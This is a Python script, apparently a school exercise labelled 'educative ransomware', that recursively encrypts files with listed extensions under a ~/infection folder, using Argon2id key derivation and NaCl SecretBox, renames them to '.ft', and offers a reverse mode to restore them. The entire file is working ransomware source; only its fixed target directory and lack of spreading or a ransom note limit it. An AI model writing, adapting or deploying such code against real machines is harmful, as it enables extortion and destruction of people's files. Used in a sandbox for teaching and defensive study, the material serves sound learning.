import argparse
import os
import stat
import glob
import hashlib
from nacl.secret import SecretBox
from nacl.pwhash import argon2id
from nacl.utils import random
from nacl.exceptions import CryptoError

def error(error_message:str):
    print("Error: " + error_message)
    exit(1)

def isreadable(filepath):
    st = os.stat(filepath)
    return bool(st.st_mode & stat.S_IRUSR)

def decryption(filepath, key):
    with open(filepath, "rb") as f:
        blob = f.read()

    offset = 0

    # Read extension length
    ext_len = blob[offset]
    offset += 1

    # Read extension
    ext = blob[offset:offset + ext_len].decode("utf-8")
    offset += ext_len

    # Read salt
    salt_size = argon2id.SALTBYTES
    salt = blob[offset:offset + salt_size]
    offset += salt_size

    # Encrypted payload (nonce + ciphertext + MAC)
    encrypted = blob[offset:]

    # Derive key
    derived_key = argon2id.kdf(
        SecretBox.KEY_SIZE,
        key,
        salt,
        opslimit=argon2id.OPSLIMIT_MODERATE,
        memlimit=argon2id.MEMLIMIT_MODERATE,
    )

    box = SecretBox(derived_key)

    try:
        data = box.decrypt(encrypted)
    except CryptoError:
        raise ValueError("Invalid key or corrupted file")

    # Restore original filename
    base, _ = os.path.splitext(filepath)
    output_path = base + ext

    with open(filepath, "wb") as f:
        f.write(data)
    os.rename(filepath, output_path)
    return output_path

def encryption(filepath, key):
    # Lire le fichier à chiffrer
    with open(filepath, "rb") as f:
        data = f.read()

    # Construction du nouveau nom de fichier
    base, ext = os.path.splitext(filepath)
    output_path = base + ".ft"

    ext_bytes = ext.encode("utf-8")

    # Générer un salt
    salt = random(argon2id.SALTBYTES)

    # Dériver la clé crypto
    derived_key = argon2id.kdf(
        SecretBox.KEY_SIZE,
        key,
        salt,
        opslimit=argon2id.OPSLIMIT_MODERATE,
        memlimit=argon2id.MEMLIMIT_MODERATE,
    )

    box = SecretBox(derived_key)
    encrypted = box.encrypt(data)

    # ecriture : [salt][nonce + ciphertext + MAC]
    with open(filepath, "wb") as f:
        f.write(bytes([len(ext_bytes)]))
        f.write(ext_bytes)
        f.write(salt)
        f.write(encrypted)
    os.rename(filepath, output_path)

    return output_path
#---------------argparse---------------#
parser = argparse.ArgumentParser(description="educative ransomware")
parser.add_argument("-v", "--version", action="version", version="1.0.0", help="display the version of the program")
parser.add_argument("-r", "--reverse", action="store_true", help="reverse the encryption to restore the encrypted files", default=False)
parser.add_argument("-s", "--silent", action="store_true", help="mute the program", default=False)

parser.add_argument("key_path", help="path to the key file", nargs="?", default=None)

args = parser.parse_args()

if args.key_path is None:
    error("path to the key is required as argument")
#---------------initialisation---------------#
extension_path = "extensions.txt"
key_path = args.key_path
target_dir = os.getenv("HOME", default="/home") + "/infection"
#---------------file extraction---------------#
extensions = []
if os.path.exists(key_path):
    if isreadable(key_path):
        with open(key_path, "rb") as f:
            key = f.read()
    else:
        error("User do not have read privilege for [" + key_path + "]")
else:
    error("File don't exist for [" + key_path + "]")
if os.path.exists(extension_path):
    with open(extension_path, "rt") as f:
        for line in f:
            extensions.append(line.strip())
else:
    error("can't find extension file")
extensions.append(".ft")
# ---------------glob recursive files retriever---------------#

files = []
if args.reverse:
    pattern = os.path.join(target_dir, "**", "*.ft")
    files.extend(glob.glob(pattern, recursive=True))
    for filepath in files:
        restore = decryption(filepath, key)
        if not args.silent:
            print(filepath + " was restored to " + restore)
else:
    for ext in extensions:
        pattern = os.path.join(target_dir, "**", f"*{ext}")
        files.extend(glob.glob(pattern, recursive=True))
    for filepath in files:
        crypted = encryption(filepath, key)
        if not args.silent:
            print(filepath + " was encrypted to " + crypted)